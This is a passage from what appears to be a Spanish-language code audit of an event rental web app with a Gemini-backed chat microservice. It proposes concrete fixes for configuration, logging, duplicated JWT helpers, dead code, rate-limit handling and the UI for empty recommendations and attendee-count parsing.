```

Y crear **`python-ia/.env.example`**, que hoy no existe (solo hay instrucciones en prosa en `python-ia/README.md:29-46`):

```dotenv
# --- Base de datos (los mismos valores deben ir en backend/.env) ---
DB_HOST=localhost
DB_PORT=5432
DB_NAME=menaje_db
DB_USER=postgres
DB_PASSWORD=tu_password

# --- Gemini --- (obtener en https://aistudio.google.com/apikey)
API_GEMINI_KEY=
GEMINI_MODEL=gemini-3.6-flash

# --- Servidor ---
PYTHON_IA_HOST=127.0.0.1
PYTHON_IA_PORT=8000
# Debe coincidir con IA_SERVICE_TOKEN de backend/.env
IA_SERVICE_TOKEN=
# 'dev' habilita /docs; cualquier otro valor lo deshabilita
IA_ENV=production
```

Añadir la excepción al `.gitignore` para que los ejemplos sí se versionen, ya que la regla `*.env` de `.gitignore:5` no los cubre (`.env.example` no termina en `.env`) pero conviene ser explícito:

```gitignore
!*.env.example
```

---

### CAL-04 — El identificador del modelo no se valida al arrancar y hay tres valores distintos en circulación
**Esfuerzo: bajo**

**Archivos y líneas**
- `python-ia/main.py:38` — `GEMINI_MODEL = os.getenv("GEMINI_MODEL", "gemini-1.5-flash")`
- `python-ia/main.py:60-61` — `genai.configure(api_key=API_GEMINI_KEY)` y el `print` de confirmación.
- `python-ia/main.py:283` — `modelo = genai.GenerativeModel(GEMINI_MODEL)` — la primera vez que el identificador se usa de verdad.
- `python-ia/.env:10` — `gemini-3.6-flash`.
- `backend/.env:14` — `gemini-1.5-flash` (no se lee, ver CAL-03).

**Descripción**
El mensaje `✅ Google Gemini configurado con el modelo: {GEMINI_MODEL}` de la línea 61 se imprime **antes** de haber comprobado nada: `genai.configure()` solo guarda la clave en memoria, no hace ninguna llamada de red ni valida que el modelo exista. El identificador no se ejerce hasta `genai.GenerativeModel(GEMINI_MODEL)` + `generate_content()` en la línea 283-284, es decir, hasta la primera petición de un usuario real.

Consecuencia: un identificador de modelo mal escrito, retirado o no disponible para esa clave produce un arranque aparentemente perfecto (con un tick verde y todo) y **todas** las peticiones fallando con 502. El síntoma llega por el camino de SEC-03, es decir, en la cara del usuario.

Nota adicional: conviene **verificar explícitamente** que `gemini-3.6-flash` (el valor efectivo hoy, `python-ia/.env:10`) es un identificador válido para la clave en uso, y que el valor por defecto del código (`gemini-1.5-flash`, `main.py:38`) sigue estando disponible — los modelos de la generación 1.5 llevan tiempo en proceso de retirada. Si el valor por defecto ya no es servible, es peor que no tener valor por defecto, porque convierte un `.env` incompleto en un fallo diferido.

**Cambio propuesto**

Comprobar el modelo contra la API al arrancar, de forma no bloqueante (un aviso, no un error fatal, para no impedir el arranque si hay un problema transitorio de red). Reemplazar `python-ia/main.py:59-61`:

```python
# Configurar cliente de Gemini
genai.configure(api_key=API_GEMINI_KEY)


def verificar_modelo_disponible(nombre_modelo: str) -> None:
    """
    Comprueba contra la API que el identificador del modelo existe y admite
    generateContent. Sin esta comprobacion, un identificador mal escrito o retirado
    da un arranque limpio y hace fallar TODAS las peticiones con 502, y el sintoma
    solo aparece cuando lo ve el primer usuario.
    No aborta el arranque: un fallo de red al listar no debe impedir levantar el servicio.
    """
    objetivo = nombre_modelo if nombre_modelo.startswith("models/") else f"models/{nombre_modelo}"
    try:
        disponibles = [
            m.name for m in genai.list_models()
            if "generateContent" in getattr(m, "supported_generation_methods", [])
        ]
    except Exception as error:
        print(f"AVISO: no se pudo verificar el modelo contra la API ({error}).")
        return

    if objetivo in disponibles:
        print(f"Google Gemini configurado con el modelo: {nombre_modelo}")
        return

    print(
        f"AVISO: el modelo '{nombre_modelo}' no aparece entre los disponibles para esta "
        f"clave. TODAS las peticiones a /chat fallaran con 502 hasta corregir "
        f"GEMINI_MODEL en python-ia/.env."
    )
    print(f"       Modelos disponibles: {', '.join(sorted(disponibles)) or '(ninguno)'}")


verificar_modelo_disponible(GEMINI_MODEL)
```

Esto convierte un fallo diferido y visible para el cliente en un aviso inmediato y visible para quien arranca el servicio, con la lista exacta de alternativas válidas. Ejecutarlo una vez y contrastar el resultado con el valor de `python-ia/.env:10` resuelve de paso la duda sobre `gemini-3.6-flash`.

---

### CAL-05 — `getJWT()` y `getUserId()` están duplicados literalmente en dos componentes
**Esfuerzo: bajo**

**Archivos y líneas**
- `backend/frontend/assets/js/chatwidget.js:227-229` — `getJWT()`.
- `backend/frontend/assets/js/chatwidget.js:234-244` — `getUserId()`, con un `catch` que cae a `localStorage.getItem('usuario_id')`.
- `backend/frontend/assets/js/recommendationcards.js:538-540` — `getJWT()`, idéntico.
- `backend/frontend/assets/js/recommendationcards.js:545-555` — `getUserId()`, casi idéntico: el `catch` devuelve `null` en lugar de consultar `localStorage`.

**Descripción**
Las dos parejas de métodos hacen lo mismo (leer el token de `localStorage` y decodificar el *payload* del JWT con `atob`), pero **divergen en el manejo del error**, que es justo la parte delicada. Una duplicación que ya empezó a separarse es la señal clásica de que hay que unificar antes de que la diferencia cause un bug.

Además, ambos decodifican el JWT en el cliente con `JSON.parse(atob(token.split('.')[1]))` sin verificar la firma —lo cual es aceptable, porque el valor solo se usa de forma informativa y el servidor toma el `usuario_id` del token verificado (`backend/routes/index.js:46`)— pero conviene que ese razonamiento esté escrito **en un solo sitio**, no repetido en dos archivos donde el siguiente lector puede confiarse.

Nota relacionada: `chatwidget.js:142` y `recommendationcards.js:189` envían `usuario_id` en el cuerpo de la petición, pero el backend lo **ignora** por completo y usa el del JWT (`routes/index.js:46`). No es un fallo (la decisión del servidor es la correcta), pero el campo hace creer que el cliente elige el usuario. Al unificar conviene dejarlo documentado.

**Cambio propuesto**

Crear `backend/frontend/assets/js/ia-auth.js`:

```javascript
/**
 * ia-auth.js
 * Utilidades de sesion compartidas por los componentes de IA (ChatWidget y
 * RecommendationCards), que antes duplicaban getJWT/getUserId con manejos de
 * error distintos.
 *
 * El payload del JWT se decodifica SIN verificar la firma: sirve solo para
 * mostrar informacion en la interfaz. La autoridad sobre la identidad es
 * siempre el servidor, que toma el usuario del token verificado
 * (backend/routes/index.js:46) e ignora el usuario_id que envie el cliente.
 */
window.IAAuth = {
    /** Token JWT en crudo, o cadena vacia si no hay sesion. */
    getJWT() {
        try {
            return localStorage.getItem('token') || '';
        } catch {
            return ''; // localStorage puede lanzar en modo privado o con cookies bloqueadas
        }
    },

    /** Id del usuario segun el payload del JWT; null si no se puede determinar. */
    getUserId() {
        const token = this.getJWT();
        if (!token) return null;

        try {
            const payload = JSON.parse(atob(token.split('.')[1]));
            return payload.id ?? payload.usuario_id ?? null;
        } catch {
            try {
                return localStorage.getItem('usuario_id');
            } catch {
                return null;
            }
        }
    },

    /** Cabeceras para una peticion autenticada a la API. */
    authHeaders(extra = {}) {
        return { 'Authorization': `Bearer ${this.getJWT()}`, ...extra };
    }
};
```

En `chatwidget.js`, eliminar los métodos de `:227-229` y `:234-244` y delegar:

```javascript
    getJWT() {
        return window.IAAuth.getJWT();
    }

    getUserId() {
        return window.IAAuth.getUserId();
    }
```

Lo mismo en `recommendationcards.js:538-555`. Se conservan los métodos como envoltorios de una línea para no tocar los puntos de uso (`chatwidget.js:139`, `:235`; `recommendationcards.js:151`, `:186`, `:546`).

Y cargar el nuevo archivo **antes** de los componentes en las cuatro páginas que los usan:

- `backend/frontend/pages/cliente/catalogo.html:113`
- `backend/frontend/pages/cliente/mi-cuenta.html:40`
- `backend/frontend/pages/cliente/mis-alquileres.html:74`
- `backend/frontend/pages/cliente/perfil.html:33`

En cada una, insertar justo antes de la etiqueta de `chatwidget.js`:

```html
<script src="/assets/js/ia-auth.js"></script>
```

---

### CAL-06 — El microservicio usa `print()` en lugar del módulo `logging`
**Esfuerzo: bajo**

**Archivos y líneas**
- `python-ia/main.py:61` — `print(f"✅ Google Gemini configurado…")`
- `python-ia/main.py:166` — `print(f"⚠️ Error obteniendo contexto de BD: {error}")`
- `python-ia/main.py:229` — `print(f"💾 Conversación guardada…")`
- `python-ia/main.py:231` — `print(f"⚠️ Error guardando conversación en BD: {error}")`
- `python-ia/main.py:259` — `print(f"💬 Nuevo mensaje de usuario_id={…}: {request.mensaje!r}")`
- `python-ia/main.py:294` — `print(f"❌ Error llamando a Gemini API: {error}")`
- `python-ia/main.py:314-322` — el banner de arranque.
- `python-ia/main.py:12-15` — el `sys.stdout.reconfigure(encoding="utf-8")` que hizo falta precisamente para que los emojis de esos `print` no rompieran en la consola cp1252 de Windows.

**Descripción**
Todo el diagnóstico del servicio va a `stdout` sin nivel, sin marca de tiempo y sin estructura. Consecuencias prácticas:

1. **No se pueden filtrar los errores.** Un `⚠️` y un `💬` son la misma cosa para cualquier herramienta: texto en `stdout`. No hay forma de decir "muéstrame solo los fallos" sin hacer `grep` por emoji.
2. **No hay marca de tiempo.** Al investigar "el chat falló esta tarde" no se puede correlacionar con nada. El backend Node **sí** registra hora en cada petición (`backend/server.js:30`, `new Date().toISOString()`), así que los dos logs no se pueden cruzar.
3. **`uvicorn` ya trae `logging` configurado** y los `print` quedan fuera de ese formato, produciendo una salida mezclada e inconsistente.
4. **Riesgo de fuga en los logs.** `main.py:259` registra el mensaje íntegro del usuario. Con `logging` se puede subir ese registro a nivel `DEBUG` y dejarlo apagado en producción; con `print` está siempre encendido.

Además, el bloque de las líneas 12-15 existe solo porque los mensajes llevan emojis. Con `logging` configurado con un *handler* de `stdout` en UTF-8, ese apaño se vuelve innecesario.

**Cambio propuesto**

Configurar `logging` una vez y sustituir los `print`. Añadir tras el bloque de configuración (después de `python-ia/main.py:38`):

```python
import logging

logging.basicConfig(
    level=os.getenv("LOG_LEVEL", "INFO").upper(),
    format="%(asctime)s %(levelname)-8s [%(name)s] %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%S%z",
)
logger = logging.getLogger("menaje.ia")
```

Sustituciones, una por una:

| Línea | Antes | Después |
|---|---|---|
| `:61` | `print(f"✅ Google Gemini configurado con el modelo: {GEMINI_MODEL}")` | `logger.info("Gemini configurado con el modelo: %s", GEMINI_MODEL)` |
| `:166` | `print(f"⚠️ Error obteniendo contexto de BD: {error}")` | `logger.error("Error obteniendo contexto de BD: %r", error)` |
| `:229` | `print(f"💾 Conversación guardada para usuario_id={usuario_id}")` | `logger.info("Conversacion guardada (estado=%s) usuario_id=%s", estado, usuario_id)` |
| `:231` | `print(f"⚠️ Error guardando conversación en BD: {error}")` | `logger.error("Error guardando conversacion en BD: %r", error)` |
| `:259` | `print(f"💬 Nuevo mensaje de usuario_id=…: {request.mensaje!r}")` | `logger.info("Nuevo mensaje de usuario_id=%s (%d caracteres)", request.usuario_id, len(request.mensaje))` y, aparte, `logger.debug("Contenido del mensaje: %r", request.mensaje)` |
| `:294` | `print(f"❌ Error llamando a Gemini API: {error}")` | `logger.error("[%s] Error llamando a Gemini API (usuario_id=%s, modelo=%s): %r", error_id, request.usuario_id, GEMINI_MODEL, error)` |

Nótese el uso de `%s`/`%r` como argumentos en lugar de f-strings: así el formateo solo se evalúa si el nivel está activo, y el mensaje del usuario (`:259`) pasa a nivel `DEBUG`, apagado por defecto en producción.

El banner de arranque (`:314-322`) puede quedarse con `print`: es una ayuda para el desarrollador al lanzar `python main.py` a mano, no un log operativo. Si se convierte a `logger.info`, entonces sí se puede eliminar el `reconfigure` de `:12-15` (los emojis del banner son lo último que lo justifica).

---

### CAL-07 — Código muerto: `hideLoadingState()` vacío y `playNotificationSound()` solo comentarios
**Esfuerzo: bajo**

**Archivos y líneas**
- `backend/frontend/assets/js/recommendationcards.js:276-278` — `hideLoadingState()` con cuerpo vacío y un comentario explicando por qué.
- `backend/frontend/assets/js/recommendationcards.js:141` — se la llama en el `finally` de `loadRecommendations`.
- `backend/frontend/assets/js/chatwidget.js:282-286` — `playNotificationSound()`, tres líneas comentadas.
- `backend/frontend/assets/js/chatwidget.js:210` — se la llama desde `addMessage`.

**Descripción**
Dos métodos que no hacen nada pero se invocan. No causan ningún fallo; el coste es de lectura: quien depure el estado de carga de las recomendaciones perderá tiempo en `hideLoadingState` antes de descubrir que el trabajo lo hace realmente `renderRecommendations` (`:283-293`) o `showErrorMessage` (`:526-533`) reemplazando el contenido del grid.

`hideLoadingState` es el más defendible de los dos, porque documenta una decisión de diseño real (el grid se sustituye, no se limpia) y forma pareja con `showLoadingState`. `playNotificationSound` es una función de reserva que además está mal cableada (ver BUG-08, punto 2).

**Cambio propuesto**

Dos opciones, según la preferencia del equipo.

**Opción A (recomendada): eliminar ambas.** Es el cambio que reduce el código sin perder información, porque el comentario explicativo se conserva en el punto de uso.

Eliminar `recommendationcards.js:276-278` y reemplazar el `finally` de `:140-142` por nada, dejando el `catch` como último bloque:

```javascript
        } catch (error) {
            console.error('Error generando recomendaciones:', error);
            this.showErrorMessage(error.message || 'No se pudieron generar las recomendaciones');
        }
        // Sin finally: renderRecommendations()/showErrorMessage() ya reemplazan el
        // contenido del grid, asi que no hay estado de carga que limpiar aparte.
```

Eliminar `chatwidget.js:282-286` y el bloque que la llama (`:208-211`):

```javascript
        this.messagesContainer.appendChild(messageDiv);

        // Scroll al último mensaje
        this.messagesContainer.scrollTop = this.messagesContainer.scrollHeight;
    }
```

**Opción B: implementar el sonido.** Si de verdad se quiere la notificación, hay que añadir el archivo de audio (hoy no existe: no hay ningún directorio `frontend/sounds/`), descomentar el cuerpo y corregir la condición según BUG-08. Es una decisión de producto, no de calidad de código; mientras no se tome, la opción A es preferible a dejar la función de reserva.

---

### CAL-08 — El `skip` de `rateLimitIA` es inalcanzable y sugiere que el middleware es global
**Esfuerzo: bajo**

**Archivos y líneas**
- `backend/middleware/rateLimitIA.js:13-16` — el `skip`:
  ```javascript
  skip: (req, res) => {
      // No aplicar rate limit a rutas que no sean /api/ia/chat
      return !req.path.includes('/ia/chat');
  }
  ```
- `backend/routes/index.js:44` — el único punto de montaje: `router.post('/ia/chat', autenticar, iaRateLimiter, async (req, res) => {…})`.

**Descripción**
El middleware se monta como manejador de una ruta concreta, no con `app.use()`. Por tanto solo se ejecuta cuando Express ya ha decidido que la petición corresponde a `POST /api/ia/chat`, y `req.path` en ese contexto siempre contiene `/ia/chat`. La condición del `skip` es invariablemente `false`: es código inalcanzable.

El daño real es de comprensión: el comentario "No aplicar rate limit a rutas que no sean /api/ia/chat" hace creer al lector que este limitador está montado globalmente y se autofiltra. Quien confíe en eso podría, por ejemplo, montarlo con `app.use()` pensando que es seguro, o buscar aquí la razón de que otra ruta no esté limitada.

También conviene notar que `skip` recibe `(req, res)` y no usa `res`, lo cual es inofensivo pero delata código copiado de un ejemplo.

**Cambio propuesto**

Eliminar por completo el bloque `skip` de `rateLimitIA.js:13-16`. El contenido final del archivo, que incorpora también la corrección de SEC-07, está escrito íntegro en **SEC-07**; este hallazgo solo justifica por separado la eliminación del `skip`.

Si en el futuro se quisiera un limitador global con excepciones, el patrón correcto es montarlo con `app.use()` en `backend/server.js` y **entonces** sí usar `skip`, dejando por escrito que la condición es ahora significativa.

---

### CAL-09 — `chatwidget.js` envía `usuario_id` en el cuerpo y el servidor lo ignora
**Esfuerzo: bajo**

**Archivos y líneas**
- `backend/frontend/assets/js/chatwidget.js:141-145` — el cuerpo de la petición incluye `usuario_id: this.userId`.
- `backend/frontend/assets/js/recommendationcards.js:188-192` — igual: `usuario_id: this.userId`.
- `backend/routes/index.js:46-47` — el servidor lo descarta: `const usuarioId = req.usuario.id; // Viene del JWT` y `const { mensaje, historico = [] } = req.body;` (nótese que `usuario_id` **no** se desestructura).
- `backend/services/iaService.js:17` — el `usuario_id` que llega a FastAPI es el del JWT, no el del cuerpo.

**Descripción**
El comportamiento del servidor es el correcto y no hay ninguna vulnerabilidad: el `usuario_id` del cuerpo se descarta silenciosamente y la identidad siempre sale del token verificado. El problema es que el código del cliente afirma lo contrario.

Quien lea `chatwidget.js:142` concluirá que el cliente elige de qué usuario se carga el contexto, lo que abre dos vías de error: (a) alguien "arregla" el backend para que respete el campo del cuerpo, introduciendo un IDOR de libro; (b) alguien depura por qué cambiar `usuario_id` en el cliente no tiene efecto. El campo es, en el mejor de los casos, ruido; en el peor, una invitación.

**Cambio propuesto**

Quitar el campo y dejar escrito por qué. Reemplazar `chatwidget.js:141-145`:

```javascript
                // No se envia usuario_id: el backend lo toma del JWT verificado
                // (backend/routes/index.js:46) e ignora cualquier valor del cuerpo.
                body: JSON.stringify({
                    mensaje: mensaje,
                    historico: this.conversationHistory.slice(-5) // Últimos 5 mensajes
                })
```

Y `recommendationcards.js:188-192`:

```javascript
            // Sin usuario_id: lo determina el backend a partir del JWT.
            body: JSON.stringify({
                mensaje,
                historico: []
            })
```

`this.userId` se sigue calculando en ambos componentes (`chatwidget.js:14`, `recommendationcards.js:23`) y puede seguir usándose para mostrar información en la interfaz; simplemente deja de viajar en la petición.

---

## 5. Mejoras de experiencia de usuario (dentro de OPCIÓN 1)

### UX-01 — Cuando la validación anti-alucinación descarta todas las recomendaciones, el usuario ve un grid vacío sin explicación
**Esfuerzo: bajo**

**Archivos y líneas**
- `backend/frontend/assets/js/recommendationcards.js:131-135` — la secuencia problemática:
  ```javascript
  if (!this.recommendations.length) {
      this.showErrorMessage('El asistente no encontró productos adecuados. Intenta con otro tipo de evento o número de asistentes.');
  }

  this.renderRecommendations();
  ```
- `backend/frontend/assets/js/recommendationcards.js:283-293` — `renderRecommendations()` hace `grid.innerHTML = ''` (`:287`) y luego no añade nada si el array está vacío.
- `backend/frontend/assets/js/recommendationcards.js:526-533` — `showErrorMessage()` inserta la alerta **fuera** del contenedor (`insertAdjacentElement('beforebegin', msg)`, `:530`) y la elimina a los 5 segundos (`:532`).
- `backend/frontend/assets/js/recommendationcards.js:236` — el `continue` que produce el array vacío (ver BUG-03).
- `backend/frontend/assets/js/recommendationcards.js:62-64` — el texto inicial del grid, que sí explica qué hacer, y que este flujo destruye.

**Descripción**
Tres defectos que se combinan en el peor resultado posible:

1. **El mensaje va fuera del sitio donde el usuario está mirando.** `insertAdjacentElement('beforebegin', …)` lo coloca *antes* del contenedor de recomendaciones, es decir, por encima de la cabecera. Si el usuario ha hecho scroll hasta el grid (y lo ha hecho: `ia-integration.js:111-113` hace `scrollIntoView` automáticamente), la alerta aparece fuera de la vista.
2. **Desaparece a los 5 segundos.** Cinco segundos después de una espera de 20-50 s, el usuario puede estar mirando otra pestaña. La única explicación se autodestruye.
3. **El grid queda literalmente vacío.** `renderRecommendations()` se llama *siempre*, incluso en el caso vacío (`:135` está fuera del `if`), y su primera acción es borrar el contenido del grid, incluido el texto de ayuda original. El estado final es un rectángulo en blanco sin ningún texto.

El usuario esperó casi un minuto y obtuvo una página en blanco donde antes había una instrucción. Nada indica si falló la red, si no hay stock, si debe reintentar o si el problema es suyo.

**Cambio propuesto**

Renderizar el estado vacío **dentro del grid**, con un mensaje que distinga los casos y que no desaparezca. Añadir un método a la clase (junto a `showLoadingState`, tras la línea 278):

```javascript
    /**
     * Estado vacio explicativo DENTRO del grid. El mensaje transitorio de
     * showErrorMessage() se inserta fuera del contenedor y se borra a los 5s, asi que
     * tras una espera de 20-50s el usuario se quedaba mirando un rectangulo en blanco.
     */
    mostrarGridVacio(titulo, detalle, sugerencias = []) {
        const grid = document.getElementById('recommendations-grid');
        if (!grid) return;

        const lista = sugerencias.length
            ? `<ul style="text-align:left;display:inline-block;margin:12px 0 0;padding-left:20px">
                   ${sugerencias.map(s => `<li>${this.escaparHTML(s)}</li>`).join('')}
               </ul>`
            : '';

        grid.innerHTML = `
            <div style="grid-column:1/-1;text-align:center;padding:28px 16px;color:#666">
                <p style="font-size:1.05rem;margin:0 0 8px"><strong>${this.escaparHTML(titulo)}</strong></p>
                <p style="margin:0">${this.escaparHTML(detalle)}</p>
                ${lista}
                <p style="margin:16px 0 0">
                    <button class="btn btn-secondary" id="rec-reintentar">Volver a intentarlo</button>
                </p>
            </div>
        `;

        document.getElementById('rec-reintentar')?.addEventListener('click', () => {
            if (this.ultimaPeticion) {
                const { tipoEvento, numAsistentes, presupuesto } = this.ultimaPeticion;
                this.loadRecommendations(tipoEvento, numAsistentes, presupuesto);
            }
        });
    }
```

(Usa `escaparHTML`, el helper introducido en SEC-06.)

Guardar los parámetros de la última petición para que el botón pueda reintentar. Reemplazar `recommendationcards.js:114-117`:

```javascript
    async loadRecommendations(tipoEvento, numAsistentes, presupuesto = null) {
        if (!this.container) return;

        this.ultimaPeticion = { tipoEvento, numAsistentes, presupuesto };
        this.showLoadingState();
```

Y reemplazar el bloque `recommendationcards.js:119-142` por una versión que distinga los tres casos de fallo:

```javascript
        try {
            const catalogo = await this.fetchCatalogo();

            if (!catalogo.length) {
                this.mostrarGridVacio(
                    'No hay productos disponibles ahora mismo',
                    'El catálogo no tiene productos con stock disponible en este momento.',
                    ['Vuelve a intentarlo más tarde.', 'Consulta con la empresa por disponibilidad para tu fecha.']
                );
                return;
            }

            const respuestaIA = await this.pedirRecomendacionesIA(tipoEvento, numAsistentes, presupuesto, catalogo);
            const items = this.parseRecomendacionesJSON(respuestaIA);

            if (!items.length) {
                // El modelo respondio, pero no en el formato JSON pedido.
                this.mostrarGridVacio(
                    'El asistente no pudo preparar la propuesta',
                    'La respuesta del asistente no se pudo interpretar. Suele resolverse al reintentar.',
                    ['Pulsa "Volver a intentarlo".', 'Si se repite, prueba con otro tipo de evento.']
                );
                return;
            }

            this.recommendations = this.resolverContraCatalogo(items, catalogo);

            if (!this.recommendations.length) {
                // Los productos sugeridos no existen en el catalogo real: se descartan
                // a proposito para no mostrar precios ni stock inventados.
                const descartados = (this.ultimosDescartados || []).slice(0, 3);
                this.mostrarGridVacio(
                    'No se encontraron productos que coincidan con la sugerencia',
                    'El asistente propuso artículos que no están en el catálogo, así que se descartaron ' +
                    'para no mostrarte precios ni stock que no podemos garantizar.',
                    [
                        'Pulsa "Volver a intentarlo": suele funcionar en el segundo intento.',
                        'Prueba con otro tipo de evento o con otro número de asistentes.',
                        ...(descartados.length ? [`Sugerencias descartadas: ${descartados.join(', ')}`] : [])
                    ]
                );
                return;
            }

            this.renderRecommendations();

        } catch (error) {
            console.error('Error generando recomendaciones:', error);
            this.mostrarGridVacio(
                'No se pudieron generar las recomendaciones',
                error.message || 'Hubo un problema al contactar con el asistente.',
                ['Comprueba tu conexión y pulsa "Volver a intentarlo".']
            );
        }
```

Cambios de comportamiento respecto al original: `renderRecommendations()` solo se invoca cuando hay algo que renderizar (así el estado vacío no se borra), cada causa de fallo tiene su propio texto, y el mensaje persiste hasta que el usuario actúa. `showErrorMessage` (`:526-533`) sigue siendo útil para avisos transitorios sobre una acción del usuario (por ejemplo el de `submitRecommendation:486`), así que se conserva.

---

### UX-02 — La detección automática del número de asistentes ignora cifras de un dígito y números escritos en palabras
**Esfuerzo: bajo**

**Archivos y líneas**
- `backend/frontend/assets/js/ia-integration.js:157` — `const numMatch = mensaje.match(/(\d{2,4})\s*(personas|asistentes|invitados)/i);`
- `backend/frontend/assets/js/ia-integration.js:158` — `const numAsistentes = numMatch ? parseInt(numMatch[1]) : null;`
- `backend/frontend/assets/js/ia-integration.js:160-166` — sin número no se dispara nada (silenciosamente).
- `backend/frontend/assets/js/ia-integration.js:118-122` — las palabras clave que activan la detección.

**Descripción**
El cuantificador `{2,4}` exige entre dos y cuatro dígitos, y la lista de sustantivos tiene solo tres entradas. La expresión falla en todos estos casos, que son formas naturales de pedir lo mismo:

| Lo que escribe el usuario | ¿Detecta? | Por qué |
|---|---|---|
| «recomienda menaje para 8 personas» | ❌ | un solo dígito |
| «recomienda para cincuenta invitados» | ❌ | número en palabras |
| «sugiere menaje para 50 pax» | ❌ | "pax" no está en la lista |
| «recomienda para 40 comensales» | ❌ | "comensales" no está |
| «necesito menaje, somos 120» | ❌ | no hay sustantivo |
| «recomienda para 30 personas» | ✅ | — |

El caso de un dígito es el más molesto porque es frecuente y porque el fallo es **silencioso**: el usuario escribe una petición perfectamente clara, el chat responde con texto (eso sí funciona), pero el panel de recomendaciones no se rellena y nada explica por qué. El usuario no tiene forma de saber que el problema era escribir "8" en lugar de "08".

Hay un detalle de implementación adicional: el rango `{2,4}` tampoco cubre el límite del formulario, que admite hasta 1000 asistentes (`ia-integration.js:84`, `max="1000"`), pero sí aceptaría 9999.

**Cambio propuesto**

Reemplazar `ia-integration.js:157-158` por una extracción en dos pasadas (cifras y palabras) con una lista de sustantivos ampliada. Añadir primero el mapa de números como propiedad estática, tras el cierre de la clase (después de la línea 168):

```javascript
// Numeros escritos en palabras que aparecen de forma realista al describir un evento.
IAIntegration.NUMEROS_EN_PALABRAS = {
    'un': 1, 'una': 1, 'dos': 2, 'tres': 3, 'cuatro': 4, 'cinco': 5,
    'seis': 6, 'siete': 7, 'ocho': 8, 'nueve': 9, 'diez': 10,
    'once': 11, 'doce': 12, 'trece': 13, 'catorce': 14, 'quince': 15,
    'dieciseis': 16, 'diecisiete': 17, 'dieciocho': 18, 'diecinueve': 19,
    'veinte': 20, 'veinticinco': 25, 'treinta': 30, 'cuarenta': 40,
    'cincuenta': 50, 'sesenta': 60, 'setenta': 70, 'ochenta': 80,
    'noventa': 90, 'cien': 100, 'ciento': 100, 'doscientos': 200,
    'trescientos': 300, 'cuatrocientos': 400, 'quinientos': 500, 'mil': 1000
};

// Sustantivos con los que la gente cuantifica a los asistentes de un evento.
IAIntegration.SUSTANTIVOS_ASISTENTES =
    'personas?|asistentes?|invitados?|comensales?|pax|convidados?|gente|puestos?|cubiertos?|sillas?';
```

Y añadir un método de extracción a la clase (antes de `extractAndRecommend`, es decir antes de la línea 138):

```javascript
    /**
     * Extrae el numero de asistentes del mensaje. Acepta cifras de 1 a 4 digitos
     * ("para 8 personas" fallaba con el patron anterior, que exigia 2 digitos),
     * numeros escritos en palabras ("cincuenta invitados") y un numero suelto
     * cuando el mensaje ya habla de un evento ("somos 120").
     * Devuelve null si no hay una cantidad plausible (1-1000, el rango del formulario).
     */
    extraerNumeroAsistentes(mensaje) {
        const texto = mensaje
            .normalize('NFD')
            .replace(/[̀-ͯ]/g, '')   // "cumpleanos", "dieciseis"
            .toLowerCase();

        const sustantivos = IAIntegration.SUSTANTIVOS_ASISTENTES;

        // 1. Cifra seguida (o precedida) del sustantivo: "80 invitados", "invitados: 80"
        const porCifra =
            texto.match(new RegExp(`(\\d{1,4})\\s*(?:${sustantivos})`)) ||
            texto.match(new RegExp(`(?:${sustantivos})\\D{0,10}?(\\d{1,4})`));
        if (porCifra) {
            const n = parseInt(porCifra[1], 10);
            if (n >= 1 && n <= 1000) return n;
        }

        // 2. Numero en palabras seguido del sustantivo: "cincuenta invitados"
        const palabras = Object.keys(IAIntegration.NUMEROS_EN_PALABRAS).join('|');
        const porPalabra = texto.match(new RegExp(`\\b(${palabras})\\b\\s*(?:${sustantivos})`));
        if (porPalabra) {
            return IAIntegration.NUMEROS_EN_PALABRAS[porPalabra[1]];
        }

        // 3. Cifra suelta con verbo de cantidad: "somos 120", "seremos unos 45"
        const porVerbo = texto.match(/\b(?:somos|seremos|seran|serian|vienen|asisten|para)\s+(?:unos?\s+|unas?\s+)?(\d{1,4})\b/);
        if (porVerbo) {
            const n = parseInt(porVerbo[1], 10);
            if (n >= 1 && n <= 1000) return n;
        }

        return null;
    }
```

Reemplazar `ia-integration.js:157-166` para usarlo y para no fallar en silencio:

```javascript
        const numAsistentes = this.extraerNumeroAsistentes(mensaje);

        if (numAsistentes) {
            console.log(`🎯 Auto-recomendación detectada: ${tipoEvento}, ${numAsistentes} asistentes`);

            setTimeout(() => {
                this.recommendationCards.loadRecommendations(tipoEvento, numAsistentes);
            }, 1000);
        } else {
            // El usuario pidio recomendaciones pero no dijo cuantos asistentes: mejor
            // preguntarselo que no hacer nada sin explicacion.
            setTimeout(() => {
                this.chatWidget.addMessage(
                    'Para preparar una propuesta necesito saber cuántos asistentes habrá. ' +
                    'Dímelo en el chat (por ejemplo, «somos 40») o usa el botón ' +
                    '🎯 Recomendaciones para rellenar el formulario.',
                    'bot'
                );
            }, 600);
        }
```

**Cuidado con la recursión:** `addMessage` está envuelto por `setupAutoRecommendations` (`:125-135`), pero el wrapper solo actúa cuando `sender === 'user'` (`:128`), y aquí se pasa `'bot'`, así que no se reentra. Conviene no cambiar ese `'bot'` por otro valor sin revisar esa condición.

Casos que deberían pasar tras el cambio: «recomienda menaje para 8 personas» → 8; «recomienda para cincuenta invitados» → 50; «sugiere menaje para 50 pax» → 50; «necesito menaje, somos 120» → 120; «recomienda menaje para una boda» → `null` y pregunta.

---

### UX-03 — Cuando se agota el rate limit, el usuario no sabe cuánto tiene que esperar
**Esfuerzo: bajo**

**Archivos y líneas**
- `backend/middleware/rateLimitIA.js:12` — `standardHeaders: false`: no se envían `RateLimit` ni `Retry-After`.
- `backend/middleware/rateLimitIA.js:8-11` — el mensaje fijo: `'Demasiadas solicitudes. Intenta de nuevo en 1 minuto.'`
- `backend/frontend/assets/js/chatwidget.js:150-151` — el widget solo mira `body.error`, ignorando el estado 429 y las cabeceras.
- `backend/frontend/assets/js/chatwidget.js:172-175` — muestra el texto tal cual, precedido de "❌ Error:".

**Descripción**
El mensaje dice "en 1 minuto", pero la ventana es deslizante (`windowMs: 60 * 1000`, `rateLimitIA.js:6`): el tiempo real de espera puede ser de 3 segundos o de 58, según cuándo se hizo la primera petición de la ventana. El usuario que espera 60 s cuando faltaban 5 pierde tiempo; el que reintenta a los 10 s vuelve a chocar y concluye que el chat está roto.

Con `standardHeaders: false` la información exacta existe en el servidor pero no se envía. Y el widget presenta el aviso como "❌ Error:", igualándolo visualmente a un fallo del sistema, cuando es un límite esperado y temporal.

**Escenario concreto donde falla**
Un cliente hace varias preguntas seguidas (fácil de provocar con BUG-01, que multiplica las peticiones). A la sexta recibe «❌ Error: Demasiadas solicitudes. Intenta de nuevo en 1 minuto.» Reintenta a los 15 segundos: mismo error. Y otra vez. La lectura natural es "el asistente está caído", y se abandona.

**Cambio propuesto**
